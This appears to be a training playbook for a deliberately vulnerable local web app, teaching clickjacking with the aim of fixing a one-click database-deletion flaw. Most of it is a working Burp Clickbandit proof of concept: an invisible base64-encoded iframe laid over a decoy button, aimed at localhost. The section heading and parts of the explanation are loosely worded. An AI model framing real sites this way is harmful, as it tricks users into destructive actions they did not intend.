# playbook-07.md - Impacting Click Jacking

Welcome to this seventh playbook, here you'll learn about ClickJacking.

## Outdated Components

### Goal

Fix the exploit where we can delete the database in one click.

### Test

### Test Feature

- Go to http://localhost:3000/hijacking
- Click on the button to delete the database

# Test Exploit


1. Copy the following piece of code or open the `exploits/clickjacked.html` file:

```html
<div id="container" style="clip-path: inset(200px 390px 248px 200px); clip: rect(200px, 390px, 248px, 200px); overflow: hidden; position: absolute; left: 0px; top: 0px; width: 100%; height: 100%;">
    <!-- Clickjacking PoC Generated by Burp Suite Professional -->
    <input id="clickjack_focus" style="opacity:0;position:absolute;left:-5000px;">
    <div id="clickjack_button" style="opacity: 1; transform-style: preserve-3d; text-align: center; font-family: Arial; font-size: 100%; width: 190px; height: 48px; z-index: 0; background-color: red; color: rgb(255, 255, 255); position: absolute; left: 200px; top: 200px;"><div style="position:relative;top: 50%;transform: translateY(-50%);">Click</div></div>
    <!-- Show this element when clickjacking is complete -->
    <div id="clickjack_complete" style="display:none;-webkit-transform-style: preserve-3d;-moz-transform-style: preserve-3d;transform-style: preserve-3d;font-family:Arial;font-size:16pt;color:red;text-align:center;width:100%;height:100%;"><div style="position:relative;top: 50%;transform: translateY(-50%);">You've been clickjacked!</div></div>
    <iframe id="parentFrame" src="data:text/html;base64,PHNjcmlwdD53aW5kb3cuYWRkRXZlbnRMaXN0ZW5lcigibWVzc2FnZSIsIGZ1bmN0aW9uKGUpeyB2YXIgZGF0YSwgY2hpbGRGcmFtZSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJjaGlsZEZyYW1lIik7IHRyeSB7IGRhdGEgPSBKU09OLnBhcnNlKGUuZGF0YSk7IH0gY2F0Y2goZSl7IGRhdGEgPSB7fTsgfSBpZighZGF0YS5jbGlja2JhbmRpdCl7IHJldHVybiBmYWxzZTsgfSBjaGlsZEZyYW1lLnN0eWxlLndpZHRoID0gZGF0YS5kb2NXaWR0aCsicHgiO2NoaWxkRnJhbWUuc3R5bGUuaGVpZ2h0ID0gZGF0YS5kb2NIZWlnaHQrInB4IjtjaGlsZEZyYW1lLnN0eWxlLmxlZnQgPSBkYXRhLmxlZnQrInB4IjtjaGlsZEZyYW1lLnN0eWxlLnRvcCA9IGRhdGEudG9wKyJweCI7fSwgZmFsc2UpOzwvc2NyaXB0PjxpZnJhbWUgc3JjPSJodHRwOi8vbG9jYWxob3N0OjMwMDAvaGlqYWNraW5nIiBzY3JvbGxpbmc9Im5vIiBzdHlsZT0id2lkdGg6OTcwcHg7aGVpZ2h0Ojk2OXB4O3Bvc2l0aW9uOmFic29sdXRlO2xlZnQ6LTE5MHB4O3RvcDo1OHB4O2JvcmRlcjowOyIgZnJhbWVib3JkZXI9IjAiIGlkPSJjaGlsZEZyYW1lIiBvbmxvYWQ9InBhcmVudC5wb3N0TWVzc2FnZShKU09OLnN0cmluZ2lmeSh7Y2xpY2tiYW5kaXQ6MX0pLCcqJykiPjwvaWZyYW1lPg==" frameborder="0" scrolling="no" style="transform: scale(1); transform-origin: 200px 200px; opacity: 0.0001; border: 0px; position: absolute; z-index: 1; width: 970px; height: 969px; left: 0px; top: 0px;"></iframe>
</div>
<script>function findPos(obj) {
    var left = 0, top = 0;
    if(obj.offsetParent) {
        while(1) {
            left += obj.offsetLeft;
            top += obj.offsetTop;
            if(!obj.offsetParent) {
                break;
            }
            obj = obj.offsetParent;
        }
    } else if(obj.x && obj.y) {
        left += obj.x;
        top += obj.y;
    }
    return [left,top];
}function generateClickArea(pos) {
    var elementWidth, elementHeight, x, y, parentFrame = document.getElementById('parentFrame'), desiredX = 200, desiredY = 200, parentOffsetWidth, parentOffsetHeight, docWidth, docHeight,
            btn = document.getElementById('clickjack_button');
    if(pos < window.clickbandit.config.clickTracking.length) {
        clickjackCompleted(false);
        elementWidth = window.clickbandit.config.clickTracking[pos].width;
        elementHeight = window.clickbandit.config.clickTracking[pos].height;
        btn.style.width = elementWidth + 'px';
        btn.style.height = elementHeight + 'px';
        window.clickbandit.elementWidth = elementWidth;
        window.clickbandit.elementHeight = elementHeight;
        x = window.clickbandit.config.clickTracking[pos].left;
        y = window.clickbandit.config.clickTracking[pos].top;
        docWidth = window.clickbandit.config.clickTracking[pos].documentWidth;
        docHeight = window.clickbandit.config.clickTracking[pos].documentHeight;
        parentOffsetWidth = desiredX - x;
        parentOffsetHeight = desiredY - y;
        parentFrame.style.width = docWidth+'px';
        parentFrame.style.height = docHeight+'px';
        parentFrame.contentWindow.postMessage(JSON.stringify({clickbandit: 1, docWidth: docWidth, docHeight: docHeight, left: parentOffsetWidth, top: parentOffsetHeight}),'*');
        calculateButtonSize(getFactor(parentFrame));
        showButton();
        if(parentFrame.style.opacity === '0') {
            calculateClip();
        }
    } else {
        resetClip();
        hideButton();
        clickjackCompleted(true);
    }
}function hideButton() {
    var btn = document.getElementById('clickjack_button');
    btn.style.opacity = 0;
}function showButton() {
    var btn = document.getElementById('clickjack_button');
    btn.style.opacity = 1;
}function clickjackCompleted(show) {
    var complete = document.getElementById('clickjack_complete');
    if(show) {
        complete.style.display = 'block';
    } else {
        complete.style.display = 'none';
    }
}window.addEventListener("message", function handleMessages(e){
    var data;
    try {
        data = JSON.parse(e.data);
    } catch(e){
        data = {};
    }
    if(!data.clickbandit) {
        return false;
    }
    showButton();
},false);window.addEventListener("blur", function(){ if(window.clickbandit.mouseover) { hideButton();setTimeout(function(){ generateClickArea(++window.clickbandit.config.currentPosition);document.getElementById("clickjack_focus").focus();},1000); } }, false);document.getElementById("parentFrame").addEventListener("mouseover",function(){ window.clickbandit.mouseover = true; }, false);document.getElementById("parentFrame").addEventListener("mouseout",function(){ window.clickbandit.mouseover = false; }, false);</script><script>window.clickbandit={mode: "review", mouseover:false,elementWidth:190,elementHeight:48,config:{"clickTracking":[{"width":190,"height":48,"mouseX":480,"mouseY":165,"left":390,"top":142,"documentWidth":970,"documentHeight":969},{"width":190,"height":48,"mouseX":520,"mouseY":153,"left":390,"top":142,"documentWidth":970,"documentHeight":969},{"width":190,"height":48,"mouseX":511,"mouseY":146,"left":390,"top":142,"documentWidth":970,"documentHeight":969}],"currentPosition":0}};function calculateClip() {
    var btn = document.getElementById('clickjack_button'), w = btn.offsetWidth, h = btn.offsetHeight, container = document.getElementById('container'), x = btn.offsetLeft, y = btn.offsetTop;
    container.style.overflow = 'hidden';
    container.style.clip = 'rect('+y+'px, '+(x+w)+'px, '+(y+h)+'px, '+x+'px)';
    container.style.clipPath = 'inset('+y+'px '+(x+w)+'px '+(y+h)+'px '+x+'px)';
}function calculateButtonSize(factor) {
    var btn = document.getElementById('clickjack_button'), resizedWidth = Math.round(window.clickbandit.elementWidth * factor), resizedHeight = Math.round(window.clickbandit.elementHeight * factor);
    btn.style.width = resizedWidth + 'px';
    btn.style.height = resizedHeight + 'px';
    if(factor > 100) {
        btn.style.fontSize = '400%';
    } else {
        btn.style.fontSize = (factor * 100) + '%';
    }
}function resetClip() {
    var container = document.getElementById('container');
    container.style.overflow = 'visible';
    container.style.clip = 'auto';
    container.style.clipPath = 'none';
}function getFactor(obj) {
    if(typeof obj.style.transform === 'string') {
        return obj.style.transform.replace(/[^\d.]/g,'');
    }
    if(typeof obj.style.msTransform === 'string') {
        return obj.style.msTransform.replace(/[^\d.]/g,'');
    }
    if(typeof obj.style.MozTransform === 'string') {
        return obj.style.MozTransform.replace(/[^\d.]/g,'');
    }
    if(typeof obj.style.oTransform === 'string') {
        return obj.style.oTransform.replace(/[^\d.]/g,'');
    }
    if(typeof obj.style.webkitTransform === 'string') {
        return obj.style.webkitTransform.replace(/[^\d.]/g,'');
    }
    return 1;
}</script>
```

2. Click on the `Click` button
3. Notice that you managed to Delete the database

### Understand the exploit


Clickjacking, also known as UI redress attack, is a type of exploit where malicious code is injected into a page or email causing users to perform unintended actions. The attacker tricks the user into clicking on something that they would not normally click on, such as a link that opens up a harmful website or downloads malware. 

An iframe trick is used to create a transparent iframe that covers the entire page. When the user clicks on the iframe, they are actually clicking on the invisible button or link underneath. This tricks the user into thinking they are clicking on something else, when in reality they are performing an action that they may not have intended to do.

While clickjacking is not considered as a security issue by itself, sometimes it can lead to critical exploits such deleting arbitrary data in one click.